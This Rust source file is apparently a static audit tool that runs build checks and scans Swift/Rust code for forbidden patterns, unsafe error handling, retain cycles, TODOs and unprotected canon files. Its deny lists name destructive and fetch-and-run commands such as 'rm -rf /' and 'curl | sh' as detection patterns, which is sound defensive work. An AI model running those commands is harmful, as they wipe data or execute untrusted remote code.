use regex::Regex;
use serde::{Deserialize, Serialize};
use std::fs;
use std::process::{Command, Stdio};
use std::time::Instant;
use walkdir::WalkDir;

fn project_dir() -> String { trios_config::project_dir() }

/// Project-relative path for an audit finding. If the file lies outside the
/// project root (e.g. reached via a symlink), fall back to the bare file name
/// instead of leaking the absolute host path (`/Users/...`) into the report -
/// findings flow into externally-visible GitHub issues downstream.
fn relative_audit_path(path: &std::path::Path) -> String {
    match path.strip_prefix(project_dir()) {
        Ok(rel) => rel.to_string_lossy().to_string(),
        Err(_) => {
            eprintln!("[clade-audit] path outside project root, redacting to file name: {}", path.display());
            path.file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_else(|| "<external>".to_string())
        }
    }
}

const MAX_FILE_SIZE: u64 = 10 * 1024 * 1024; // 10MB

fn read_file_bounded(path: &std::path::Path) -> Option<String> {
    let meta = fs::metadata(path).ok()?;
    if meta.len() > MAX_FILE_SIZE {
        eprintln!("[audit] Skipping {} - exceeds {}MB limit ({}MB)", path.display(), MAX_FILE_SIZE / 1024 / 1024, meta.len() / 1024 / 1024);
        return None;
    }
    fs::read_to_string(path).ok()
}

#[derive(Serialize, Deserialize, Debug, Clone)]
struct AuditFinding {
    file: String,
    line: u32,
    severity: String,
    category: String,
    message: String,
    fingerprint: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct BuildCheckResult {
    passed: bool,
    swift_ok: bool,
    rust_ok: bool,
    swift_errors: Vec<String>,
    rust_errors: Vec<String>,
    duration_ms: u128,
}

#[derive(Serialize, Deserialize, Debug)]
struct CanonCheckResult {
    passed: bool,
    findings: Vec<AuditFinding>,
    scanned_files: usize,
    duration_ms: u128,
}

#[derive(Serialize, Deserialize, Debug)]
struct SecurityCheckResult {
    passed: bool,
    findings: Vec<AuditFinding>,
    scanned_files: usize,
    duration_ms: u128,
}

/// Run build checks: ./build.sh + cargo check --workspace.
fn build_check() -> BuildCheckResult {
    let start = Instant::now();

    // Swift canonical build via the project's own build script, which builds
    // QueenUILib and the tracked production source closure. Direct swiftc
    // -typecheck misses the external module and untracked BR-OUTPUT prototypes.
    let swift_output = Command::new("./build.sh")
        .current_dir(project_dir())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    let (swift_ok, swift_errors) = match swift_output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            // The build script runs both compilation and chat E2E tests. E2E logs
            // intentionally mention "error:" (simulated transport failures) and
            // must not be treated as build failures. Only an explicit [FAIL]
            // tag or a non-zero exit status indicates a real gate failure.
            let errors: Vec<String> = stdout
                .lines()
                .chain(stderr.lines())
                .filter(|l| l.contains("[FAIL]"))
                .map(|s| s.trim().to_string())
                .collect();
            (out.status.success() && errors.is_empty(), errors)
        }
        Err(e) => (false, vec![format!("./build.sh execution failed: {}", e)]),
    };

    // Rust workspace check
    let rust_output = Command::new("cargo")
        .args(["check", "--workspace"])
        .current_dir(project_dir())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    let (rust_ok, rust_errors) = match rust_output {
        Ok(out) => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            let errors: Vec<String> = stderr
                .lines()
                .filter(|l| l.contains("error"))
                .map(|s| s.to_string())
                .collect();
            (out.status.success() && errors.is_empty(), errors)
        }
        Err(e) => (false, vec![format!("cargo check execution failed: {}", e)]),
    };

    BuildCheckResult {
        passed: swift_ok && rust_ok,
        swift_ok,
        rust_ok,
        swift_errors,
        rust_errors,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// Scan source files for forbidden security patterns.
/// Content to scan for forbidden patterns, with self-noise removed:
/// - the auditor's OWN source literally defines the patterns it searches for,
///   so scanning it is a guaranteed self-match (e.g. the `rm -rf /` regex
///   string) - skip it entirely;
/// - test modules (`#[cfg(test)]`) legitimately contain "bad" fixtures
///   (`api_key="sk_..."`, `try!`, forbidden-pattern strings), so drop the test
///   tail. Truncating at the marker keeps real findings' line numbers intact.
///
/// Without this the scanner emitted ~300 false-positive criticals that would
/// pollute the autonomous issue/PR pipeline.
fn scannable_content(path: &std::path::Path, content: &str) -> String {
    if path.to_string_lossy().contains("clade-audit/src") {
        return String::new();
    }
    match content.find("#[cfg(test)]") {
        Some(idx) => content[..idx].to_string(),
        None => content.to_string(),
    }
}

fn should_skip_audit_path(path: &std::path::Path) -> bool {
    let s = path.to_string_lossy();
    s.contains("target/")
        || s.contains(".build/")
        || s.contains(".git/")
        || s.contains(".worktrees/")
}

/// Paths that are not part of the shipped runtime and should not contribute
/// actionable TODO inventory findings. Planning docs, agent/skill templates,
/// and archived experiments can mention TODO/BUG freely without polluting the
/// code-level inventory.
fn should_skip_todo_path(path: &std::path::Path) -> bool {
    let s = path.to_string_lossy();
    s.contains(".archive/")
        || s.contains(".claude/agents/")
        || s.contains(".claude/skills/")
        || s.contains(".claude/plans/")
        || s.contains(".trinity/specs/")
        || s.contains(".trinity/wave-loop")
        || s.contains(".llm/plans/")
        || s.contains("trios-mesh/smoke/")
        || s.ends_with("PluginTemplate.swift")
        || s.ends_with("docs/LAUNCH_PLAN.md")
        || s.ends_with("docs/INSTALLATION_README.md")
        || s.ends_with("INSTALL_TODO.md")
        || s.ends_with(".trinity/experience.md")
}

/// Returns true when a line (or the line immediately before it) carries an
/// AGENT-V-WAIVER marker. Waivers allow documented dangerous constants and test
/// fixtures without polluting the security/error gates.
fn is_waived(prev: Option<&str>, line: &str) -> bool {
    if line.contains("AGENT-V-WAIVER") {
        return true;
    }
    if let Some(p) = prev {
        if p.contains("AGENT-V-WAIVER") {
            return true;
        }
    }
    false
}

fn security_check() -> SecurityCheckResult {
    let start = Instant::now();
    let mut findings: Vec<AuditFinding> = vec![];
    let mut scanned = 0;

    let forbidden_patterns: Vec<(&str, &str, &str)> = vec![
        (r"rm\s+-rf\s+/", "critical", "Forbidden: rm -rf /"),
        (r"curl\s+.*\|\s*sh", "critical", "Forbidden: curl | sh"),
        (r"try!\s*\(", "warning", "Unsafe: bare try! macro"),
        (r"as!\s*\w+", "warning", "Unsafe: force cast as!"),
        (r#"api[_-]?key\s*=\s*[^"']*["']\w{20,}"#, "critical", "Hardcoded API key"),
        (r#"password\s*=\s*["']\w+["']"#, "warning", "Hardcoded password"),
        (r#"token\s*=\s*["']\w{20,}["']"#, "critical", "Hardcoded token"),
        (r"NSLog\s*\(\s*[^)]*secret", "warning", "NSLog may leak secret"),
        (r"print\s*\(\s*[^)]*secret", "warning", "print may leak secret"),
    ];

    let compiled: Vec<(Regex, &str, &str)> = forbidden_patterns
        .into_iter()
        .filter_map(|(pat, sev, msg)| {
            Regex::new(pat).ok().map(|re| (re, sev, msg))
        })
        .collect();

    for entry in WalkDir::new(project_dir())
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            let p = e.path();
            let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("");
            !should_skip_audit_path(p) && (ext == "swift" || ext == "rs" || ext == "sh")
        })
    {
        scanned += 1;
        let path = entry.path();
        let raw = match read_file_bounded(path) {
            Some(c) => c,
            None => continue,
        };
        let content = scannable_content(path, &raw);

        for (re, severity, message) in &compiled {
            let mut prev_line: Option<&str> = None;
            for (line_idx, line) in content.lines().enumerate() {
                if re.is_match(line) && !is_waived(prev_line, line) {
                    let file = relative_audit_path(path);
                    let fingerprint = format!("{}:{}:{}", &file, line_idx + 1, message);
                    findings.push(AuditFinding {
                        file,
                        line: (line_idx + 1) as u32,
                        severity: (*severity).to_string(),
                        category: "security".to_string(),
                        message: (*message).to_string(),
                        fingerprint,
                    });
                }
                prev_line = Some(line);
            }
        }
    }

    SecurityCheckResult {
        passed: findings.is_empty(),
        findings,
        scanned_files: scanned,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// Scan Swift files for Process() shell calls without allowlist (SOUL.md Article IX).
fn shell_safety_check() -> SecurityCheckResult {
    let start = Instant::now();
    let mut findings: Vec<AuditFinding> = vec![];
    let mut scanned = 0;

    let process_re = match Regex::new(r"Process\(\)") {
        Ok(re) => re,
        Err(e) => { eprintln!("[audit] Bad regex: {}", e); return SecurityCheckResult { passed: true, findings: vec![], scanned_files: 0, duration_ms: 0 }; }
    };
    let shell_re = match Regex::new(r#"arguments:\s*\[\s*"-c""#) {
        Ok(re) => re,
        Err(e) => { eprintln!("[audit] Bad regex: {}", e); return SecurityCheckResult { passed: true, findings: vec![], scanned_files: 0, duration_ms: 0 }; }
    };

    let forbidden_substrings: Vec<&str> = vec![
        "rm -rf /",
        "curl .* | sh",
        "> /dev/null",
        "trios_app",
        "open trios",
    ];

    for entry in WalkDir::new(project_dir())
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            let p = e.path();
            let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("");
            ext == "swift" && !should_skip_audit_path(p)
        })
    {
        scanned += 1;
        let path = entry.path();
        let content = match read_file_bounded(path) {
            Some(c) => c,
            None => continue,
        };

        let file = relative_audit_path(path);

        for (line_idx, line) in content.lines().enumerate() {
            if process_re.is_match(line) && shell_re.is_match(line) {
                let has_allowlist = forbidden_substrings.iter().any(|pat| {
                    let pat_re = Regex::new(pat).ok();
                    pat_re.is_some_and(|re| re.is_match(&content))
                });
                if has_allowlist {
                    continue;
                }
                let fingerprint = format!("{}:{}:shell_no_allowlist", &file, line_idx + 1);
                findings.push(AuditFinding {
                    file: file.clone(),
                    line: (line_idx + 1) as u32,
                    severity: "warning".to_string(),
                    category: "shell_safety".to_string(),
                    message: "Process() with zsh -c lacks explicit allowlist".to_string(),
                    fingerprint,
                });
            }
        }
    }

    SecurityCheckResult {
        passed: findings.is_empty(),
        findings,
        scanned_files: scanned,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// Scan for bare try!, as!, and unhandled try? in Swift/Rust.
fn error_handling_check() -> SecurityCheckResult {
    let start = Instant::now();
    let mut findings: Vec<AuditFinding> = vec![];
    let mut scanned = 0;

    let patterns: Vec<(&str, &str, &str)> = vec![
        (r"try!\s*\(", "warning", "Bare try! - use try? or do-catch"),
        (r"as!\s*\w+", "warning", "Force cast as! - use as? with guard"),
        (r"as!\s*\[", "warning", "Force cast as! - use as? with guard"),
        (r"try\?\s*\([^)]*\)\s*(?:(?!guard|if\s+let|let\s+_).)*$", "info", "Unhandled try? result"),
    ];

    let compiled: Vec<(Regex, &str, &str)> = patterns
        .into_iter()
        .filter_map(|(pat, sev, msg)| {
            Regex::new(pat).ok().map(|re| (re, sev, msg))
        })
        .collect();

    for entry in WalkDir::new(project_dir())
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            let p = e.path();
            let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("");
            (ext == "swift" || ext == "rs") && !should_skip_audit_path(p)
        })
    {
        scanned += 1;
        let path = entry.path();
        let raw = match read_file_bounded(path) {
            Some(c) => c,
            None => continue,
        };
        let content = scannable_content(path, &raw);

        let file = relative_audit_path(path);

        for (re, severity, message) in &compiled {
            let mut prev_line: Option<&str> = None;
            for (line_idx, line) in content.lines().enumerate() {
                if re.is_match(line) && !is_waived(prev_line, line) {
                    let fingerprint = format!("{}:{}:{}", &file, line_idx + 1, message);
                    findings.push(AuditFinding {
                        file: file.clone(),
                        line: (line_idx + 1) as u32,
                        severity: (*severity).to_string(),
                        category: "error_handling".to_string(),
                        message: (*message).to_string(),
                        fingerprint,
                    });
                }
                prev_line = Some(line);
            }
        }
    }

    SecurityCheckResult {
        passed: findings.is_empty(),
        findings,
        scanned_files: scanned,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// Detect Swift 6 concurrency anti-patterns: missing [weak self] in async closures,
/// actor-isolated mutable state accessed from concurrent contexts.
fn concurrency_check() -> SecurityCheckResult {
    let start = Instant::now();
    let mut findings: Vec<AuditFinding> = vec![];
    let mut scanned = 0;

    let patterns: Vec<(&str, &str, &str)> = vec![
        (r"Timer\.scheduledTimer.*\{\s*_.*in\s*\n?\s*self\.", "warning", "Timer closure captures self strongly - add [weak self]"),
        (r"Timer\.publish.*\.sink.*\{\s*.*in\s*\n?\s*self\.", "warning", "Timer sink captures self strongly - add [weak self]"),
        (r"DispatchQueue\.main\.async\s*\{\s*\n?\s*self\.", "warning", "DispatchQueue closure captures self strongly - add [weak self]"),
        (r"Task\s*\{\s*\n?\s*self\.", "warning", "Task captures self strongly - add [weak self] or capture list"),
        (r"@Published\s+var\s+\w+.*=.*\[\]", "info", "@Published array default - consider empty init for clarity"),
    ];

    let compiled: Vec<(Regex, &str, &str)> = patterns
        .into_iter()
        .filter_map(|(pat, sev, msg)| {
            Regex::new(pat).ok().map(|re| (re, sev, msg))
        })
        .collect();

    for entry in WalkDir::new(project_dir())
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            let p = e.path();
            let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("");
            ext == "swift" && !should_skip_audit_path(p)
        })
    {
        scanned += 1;
        let path = entry.path();
        let raw = match read_file_bounded(path) {
            Some(c) => c,
            None => continue,
        };
        let content = scannable_content(path, &raw);

        let file = relative_audit_path(path);

        for (re, severity, message) in &compiled {
            let mut prev_line: Option<&str> = None;
            for (line_idx, line) in content.lines().enumerate() {
                if re.is_match(line) && !is_waived(prev_line, line) {
                    let fingerprint = format!("{}:{}:{}", &file, line_idx + 1, message);
                    findings.push(AuditFinding {
                        file: file.clone(),
                        line: (line_idx + 1) as u32,
                        severity: (*severity).to_string(),
                        category: "concurrency".to_string(),
                        message: (*message).to_string(),
                        fingerprint,
                    });
                }
                prev_line = Some(line);
            }
        }
    }

    SecurityCheckResult {
        passed: findings.is_empty(),
        findings,
        scanned_files: scanned,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// Extract an actionable TODO/FIXME keyword and description from a line of
/// Swift or Rust source. Only matches keywords inside comments so identifiers
/// like `Debug` / `warning` / `TODOItem` do not produce false positives.
fn code_todo_match(line: &str, re: &Regex) -> Option<(&'static str, String)> {
    let caps = re.captures(line)?;
    let keyword = caps.get(2)?.as_str().to_uppercase();
    let static_keyword = match keyword.as_str() {
        "TODO" => "TODO",
        "FIXME" => "FIXME",
        "HACK" => "HACK",
        "XXX" => "XXX",
        "WARN" => "WARN",
        "BUG" => "BUG",
        _ => return None,
    };
    let desc = caps.get(3)?.as_str().trim().to_string();
    Some((static_keyword, desc))
}

/// Extract an actionable TODO/FIXME keyword and description from a Markdown
/// line. Only matches task checkboxes (`- [ ] TODO:`) or section headings
/// (`## TODO`) so inline prose and link text do not produce false positives.
fn markdown_todo_match(line: &str, re: &Regex) -> Option<(&'static str, String)> {
    let trimmed = line.trim_start();
    let is_task = trimmed.starts_with("- [") || trimmed.starts_with("-[");
    let is_heading = trimmed.starts_with('#');
    if !is_task && !is_heading {
        return None;
    }
    let caps = re.captures(line)?;
    let keyword = caps.get(1)?.as_str().to_uppercase();
    let static_keyword = match keyword.as_str() {
        "TODO" => "TODO",
        "FIXME" => "FIXME",
        "HACK" => "HACK",
        "XXX" => "XXX",
        "WARN" => "WARN",
        "BUG" => "BUG",
        _ => return None,
    };
    let desc = caps.get(2)?.as_str().trim().to_string();
    Some((static_keyword, desc))
}

/// Inventory TODO and FIXME comments with severity categorization.
fn todo_check() -> SecurityCheckResult {
    let start = Instant::now();
    let mut findings: Vec<AuditFinding> = vec![];
    let mut scanned = 0;

    let code_re = Regex::new(r"(?i)(///|//|/\*)\s*\b(TODO|FIXME|HACK|XXX|WARN|BUG)\b\s*[:\-]?\s*(.*)").ok();
    let md_re = Regex::new(r"(?i)\b(TODO|FIXME|HACK|XXX|WARN|BUG)\b\s*[:\-]?\s*(.*)").ok();

    for entry in WalkDir::new(project_dir())
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            let p = e.path();
            let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("");
            (ext == "swift" || ext == "rs" || ext == "md")
                && !should_skip_audit_path(p)
                && !should_skip_todo_path(p)
        })
    {
        scanned += 1;
        let path = entry.path();
        let raw = match read_file_bounded(path) {
            Some(c) => c,
            None => continue,
        };
        // Drop the auditor's own source and test-module tails so test fixtures
        // (e.g. the old TODO regex unit test) do not self-match.
        let content = scannable_content(path, &raw);

        let file = relative_audit_path(path);
        let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");

        for (line_idx, line) in content.lines().enumerate() {
            let matched = match ext {
                "md" => md_re.as_ref().and_then(|re| markdown_todo_match(line, re)),
                "swift" | "rs" => code_re.as_ref().and_then(|re| code_todo_match(line, re)),
                _ => None,
            };
            if let Some((keyword, desc)) = matched {
                let severity = match keyword {
                    "FIXME" | "BUG" => "critical",
                    "TODO" | "HACK" | "XXX" => "warning",
                    _ => "info",
                };
                let message = format!("{}: {}", keyword, desc);
                let fingerprint = format!("{}:{}:{}", &file, line_idx + 1, &message);
                findings.push(AuditFinding {
                    file: file.clone(),
                    line: (line_idx + 1) as u32,
                    severity: severity.to_string(),
                    category: "todo_inventory".to_string(),
                    message,
                    fingerprint,
                });
            }
        }
    }

    SecurityCheckResult {
        passed: findings.is_empty(),
        findings,
        scanned_files: scanned,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// Heuristic dead-code detection: private func in Swift / non-pub fn in Rust
/// not referenced in the same file.
fn unused_code_check() -> SecurityCheckResult {
    let start = Instant::now();
    let mut findings: Vec<AuditFinding> = vec![];
    let mut scanned = 0;

    let swift_private_func = match Regex::new(r"private\s+func\s+(\w+)") {
        Ok(re) => re,
        Err(e) => { eprintln!("[audit] Bad regex: {}", e); return SecurityCheckResult { passed: true, findings: vec![], scanned_files: 0, duration_ms: 0 }; }
    };
    let rust_non_pub_fn = match Regex::new(r"^\s*fn\s+(\w+)") {
        Ok(re) => re,
        Err(e) => { eprintln!("[audit] Bad regex: {}", e); return SecurityCheckResult { passed: true, findings: vec![], scanned_files: 0, duration_ms: 0 }; }
    };

    for entry in WalkDir::new(project_dir())
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            let p = e.path();
            let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("");
            (ext == "swift" || ext == "rs") && !should_skip_audit_path(p)
        })
    {
        scanned += 1;
        let path = entry.path();
        let content = match read_file_bounded(path) {
            Some(c) => c,
            None => continue,
        };

        let file = relative_audit_path(path);

        let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");

        if ext == "swift" {
            for caps in swift_private_func.captures_iter(&content) {
                let name = caps.get(1).map(|m| m.as_str()).unwrap_or("");
                let match_start = match caps.get(0) { Some(m) => m.start(), None => continue };
                let decl_line = content[..match_start]
                    .lines()
                    .count() as u32 + 1;
                let refs = content.matches(name).count();
                // decl itself counts as 1; if only 1, it's unused
                if refs <= 1 {
                    let fingerprint = format!("{}:{}:unused_private_func:{}", &file, decl_line, name);
                    findings.push(AuditFinding {
                        file: file.clone(),
                        line: decl_line,
                        severity: "info".to_string(),
                        category: "unused_code".to_string(),
                        message: format!("Private func '{}' appears unused in file", name),
                        fingerprint,
                    });
                }
            }
        } else if ext == "rs" {
            for caps in rust_non_pub_fn.captures_iter(&content) {
                let name = caps.get(1).map(|m| m.as_str()).unwrap_or("");
                let match_start = match caps.get(0) { Some(m) => m.start(), None => continue };
                let decl_line = content[..match_start]
                    .lines()
                    .count() as u32 + 1;
                let refs = content.matches(name).count();
                if refs <= 1 {
                    let fingerprint = format!("{}:{}:unused_fn:{}", &file, decl_line, name);
                    findings.push(AuditFinding {
                        file: file.clone(),
                        line: decl_line,
                        severity: "info".to_string(),
                        category: "unused_code".to_string(),
                        message: format!("Non-pub fn '{}' appears unused in file", name),
                        fingerprint,
                    });
                }
            }
        }
    }

    SecurityCheckResult {
        passed: findings.is_empty(),
        findings,
        scanned_files: scanned,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// T27 L2 GENERATION enforcement: every BR-OUTPUT/*.swift file must either
/// have an active claim, a valid AGENT-V-WAIVER block, or an existing seal.
/// L6 SSOT files (ProjectPaths.swift, TriosTheme.swift) require a spec and
/// explicit L6 waiver in the ownership index instead of a generated seal.
fn canon_check(dry_run: bool) -> CanonCheckResult {
    let start = Instant::now();
    let mut findings: Vec<AuditFinding> = vec![];
    let mut scanned = 0;

    let ownership_path = std::path::PathBuf::from(format!("{}/.trinity/state/ownership-index.json", project_dir()));
    let ownership: serde_json::Value = match fs::read_to_string(&ownership_path) {
        Ok(raw) => serde_json::from_str(&raw).unwrap_or_else(|e| {
            eprintln!("[audit] Failed to parse ownership-index.json: {}", e);
            serde_json::Value::Null
        }),
        Err(e) => {
            eprintln!("[audit] Missing ownership-index.json: {}", e);
            serde_json::Value::Null
        }
    };

    let l6_ssot: Vec<String> = ownership
        .get("l6_ssot_files")
        .and_then(|v| v.as_array())
        .map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect())
        .unwrap_or_default();

    let files = ownership.get("files").and_then(|v| v.as_object()).cloned().unwrap_or_default();

    let active_claims_dir = std::path::PathBuf::from(format!("{}/.trinity/claims/active", project_dir()));
    let seals_dir = std::path::PathBuf::from(format!("{}/.trinity/seals", project_dir()));

    let active_claim_resources: std::collections::HashSet<String> = match fs::read_dir(&active_claims_dir) {
        Ok(entries) => entries
            .filter_map(|e| e.ok())
            .filter_map(|e| {
                let path = e.path();
                if path.extension().and_then(|s| s.to_str()) != Some("json") {
                    return None;
                }
                let raw = fs::read_to_string(&path).ok()?;
                let v: serde_json::Value = serde_json::from_str(&raw).ok()?;
                // Claim may cover a spec_path, graph_node, or file key.
                v.get("spec_path")
                    .and_then(|x| x.as_str().map(String::from))
                    .or_else(|| v.get("graph_node").and_then(|x| x.as_str().map(String::from)))
                    .or_else(|| v.get("resource").and_then(|x| x.as_str().map(String::from)))
            })
            .collect(),
        Err(_) => std::collections::HashSet::new(),
    };

    let seal_files: std::collections::HashSet<String> = match fs::read_dir(&seals_dir) {
        Ok(entries) => entries
            .filter_map(|e| e.ok())
            .filter_map(|e| {
                let path = e.path();
                path.file_stem().and_then(|s| s.to_str()).map(String::from)
            })
            .collect(),
        Err(_) => std::collections::HashSet::new(),
    };

    let br_output = std::path::PathBuf::from(format!("{}/BR-OUTPUT", project_dir()));
    for entry in WalkDir::new(&br_output)
        .max_depth(1)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.path().extension().and_then(|s| s.to_str()) == Some("swift"))
    {
        scanned += 1;
        let path = entry.path();
        let rel = relative_audit_path(path);
        let stem = path.file_stem().and_then(|s| s.to_str()).unwrap_or("").to_string();
        let meta = files.get(&rel);

        let content = match read_file_bounded(path) {
            Some(c) => c,
            None => continue,
        };

        let has_waiver_block = content.contains("AGENT-V-WAIVER:");
        let has_active_claim = active_claim_resources.iter().any(|r| {
            rel.contains(r)
                || meta.as_ref().is_some_and(|m| {
                    m.get("spec")
                        .and_then(|s| s.as_str())
                        .is_some_and(|s| r.contains(s) || s.contains(r))
                        || m.get("graph_node")
                            .and_then(|s| s.as_str())
                            .is_some_and(|s| r.contains(s) || s.contains(r))
                })
        });
        let has_seal = seal_files.contains(&stem);
        let is_l6_ssot = l6_ssot.contains(&rel);
        let has_spec = meta.as_ref().is_some_and(|m| m.get("spec").is_some());

        if dry_run {
            eprintln!(
                "[DRY-RUN] {}: waiver={} claim={} seal={} spec={} l6={}",
                rel, has_waiver_block, has_active_claim, has_seal, has_spec, is_l6_ssot
            );
        }

        if is_l6_ssot {
            if !has_spec {
                findings.push(AuditFinding {
                    file: rel.clone(),
                    line: 1,
                    severity: "critical".to_string(),
                    category: "l2_generation".to_string(),
                    message: "L6 SSOT file has no spec in ownership-index.json".to_string(),
                    fingerprint: format!("{}:1:l6_ssot_missing_spec", rel),
                });
            }
            if !has_waiver_block && !has_active_claim && !has_seal {
                findings.push(AuditFinding {
                    file: rel.clone(),
                    line: 1,
                    severity: "warning".to_string(),
                    category: "l2_generation".to_string(),
                    message: "L6 SSOT file has no active claim, waiver, or seal".to_string(),
                    fingerprint: format!("{}:1:l6_ssot_unprotected", rel),
                });
            }
            continue;
        }

        if has_waiver_block || has_active_claim || has_seal {
            continue;
        }

        findings.push(AuditFinding {
            file: rel.clone(),
            line: 1,
            severity: "critical".to_string(),
            category: "l2_generation".to_string(),
            message: "Canon Swift file has no active claim, AGENT-V-WAIVER, or seal".to_string(),
            fingerprint: format!("{}:1:canon_unprotected", rel),
        });
    }

    CanonCheckResult {
        passed: findings.is_empty(),
        findings,
        scanned_files: scanned,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// Detect retain cycle risks: closures capturing self without [weak self]
/// in Combine sinks, DispatchQueue.asyncAfter, and URLSession tasks.
fn retain_cycle_check() -> SecurityCheckResult {
    let start = Instant::now();
    let mut findings: Vec<AuditFinding> = vec![];
    let mut scanned = 0;

    let patterns: Vec<(&str, &str, &str)> = vec![
        (r"\.sink\s*\{\s*[^\[]*self\.", "warning", "sink closure captures self without [weak self]"),
        (r"\.assign\(to:\s*\$\w+.*on:\s*self", "warning", "assign(to:on:) retains self strongly"),
        (r"DispatchQueue\.\w+\.asyncAfter.*\{\s*[^\[]*self\.", "warning", "asyncAfter closure captures self strongly"),
        (r"URLSession\.shared\.\w+.*\{\s*[^\[]*self\.", "warning", "URLSession closure captures self strongly"),
    ];

    let compiled: Vec<(Regex, &str, &str)> = patterns
        .into_iter()
        .filter_map(|(pat, sev, msg)| {
            Regex::new(pat).ok().map(|re| (re, sev, msg))
        })
        .collect();

    for entry in WalkDir::new(project_dir())
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            let p = e.path();
            let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("");
            ext == "swift" && !should_skip_audit_path(p)
        })
    {
        scanned += 1;
        let path = entry.path();
        let raw = match read_file_bounded(path) {
            Some(c) => c,
            None => continue,
        };
        let content = scannable_content(path, &raw);

        let file = relative_audit_path(path);

        for (re, severity, message) in &compiled {
            let mut prev_line: Option<&str> = None;
            for (line_idx, line) in content.lines().enumerate() {
                if re.is_match(line) && !is_waived(prev_line, line) {
                    let fingerprint = format!("{}:{}:{}", &file, line_idx + 1, message);
                    findings.push(AuditFinding {
                        file: file.clone(),
                        line: (line_idx + 1) as u32,
                        severity: (*severity).to_string(),
                        category: "retain_cycle".to_string(),
                        message: (*message).to_string(),
                        fingerprint,
                    });
                }
                prev_line = Some(line);
            }
        }
    }

    SecurityCheckResult {
        passed: findings.is_empty(),
        findings,
        scanned_files: scanned,
        duration_ms: start.elapsed().as_millis(),
    }
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--help" || a == "-h") {
        print_help();
        return;
    }

    let dry_run = args.iter().any(|a| a == "--dry-run");
    let json_mode = args.iter().any(|a| a == "--json");
    let canon_mode = args.iter().any(|a| a == "--canon");

    // Subcommand: generate-awareness
    if args.iter().any(|a| a == "generate-awareness") {
        println!("===========================================================");
        println!("  CLADE-AUDIT: Self-Awareness Generator");
        println!("  Dry run: {}", dry_run);
        println!("===========================================================\n");
        generate_self_awareness(dry_run);
        return;
    }

    // In --json mode, stdout must be PURE JSON: clade-tablecloth's parser
    // slices from the first `{`, so any banner/progress on stdout corrupts it
    // (root cause of the audit_parse_fail events). Route all human output to
    // stderr when json_mode (CLI convention: results on stdout, progress on
    // stderr - Heroku/Salesforce/AWS).
    macro_rules! note {
        ($($arg:tt)*) => {{
            if json_mode { eprintln!($($arg)*); } else { println!($($arg)*); }
        }};
    }

    if canon_mode {
        let canon = canon_check(dry_run);
        if json_mode {
            let report = serde_json::json!({"canon_check": canon});
            println!("{}", serde_json::to_string_pretty(&report).unwrap_or_default());
        } else {
            println!("===========================================================");
            println!("  CLADE-AUDIT: T27 Canon Guard");
            println!("  Dry run: {}", dry_run);
            println!("===========================================================\n");
            println!(
                "   {} Files scanned: {} | Findings: {} | {}ms",
                if canon.passed { "[OK]" } else { "[FAIL]" },
                canon.scanned_files,
                canon.findings.len(),
                canon.duration_ms
            );
            for f in &canon.findings {
                println!("   [{}] {}:{} - {}", f.severity.to_uppercase(), f.file, f.line, f.message);
            }
        }
        std::process::exit(if canon.passed { 0 } else { 1 });
    }

    note!("===========================================================");
    note!("  CLADE-AUDIT: Trinity Self-Critic");
    note!("  Dry run: {} | JSON: {}", dry_run, json_mode);
    note!("===========================================================\n");

    // Stage 1: Build check
    note!("[Check 1/8] Build gate - swiftc + cargo check");
    let build = build_check();
    note!(
        "   {} Swift: {} errors | Rust: {} errors | {}ms",
        if build.passed { "[OK]" } else { "[FAIL]" },
        build.swift_errors.len(),
        build.rust_errors.len(),
        build.duration_ms
    );

    // Stage 2: Security check
    note!("[Check 2/8] Security scan - forbidden patterns");
    let security = security_check();
    note!(
        "   {} Files scanned: {} | Findings: {} | {}ms",
        if security.passed { "[OK]" } else { "[FAIL]" },
        security.scanned_files,
        security.findings.len(),
        security.duration_ms
    );
    for f in &security.findings {
        note!("   [WARN]  {}:{} - {} ({})", f.file, f.line, f.message, f.severity);
    }

    // Stage 3: Shell safety check
    note!("[Check 3/8] Shell safety - Process() allowlist");
    let shell = shell_safety_check();
    note!(
        "   {} Files scanned: {} | Findings: {} | {}ms",
        if shell.passed { "[OK]" } else { "[FAIL]" },
        shell.scanned_files,
        shell.findings.len(),
        shell.duration_ms
    );
    for f in &shell.findings {
        note!("   [WARN]  {}:{} - {}", f.file, f.line, f.message);
    }

    // Stage 4: Error handling check
    note!("[Check 4/8] Error handling - try!, as!, unhandled try?");
    let err = error_handling_check();
    note!(
        "   {} Files scanned: {} | Findings: {} | {}ms",
        if err.passed { "[OK]" } else { "[FAIL]" },
        err.scanned_files,
        err.findings.len(),
        err.duration_ms
    );
    for f in &err.findings {
        note!("   [WARN]  {}:{} - {}", f.file, f.line, f.message);
    }

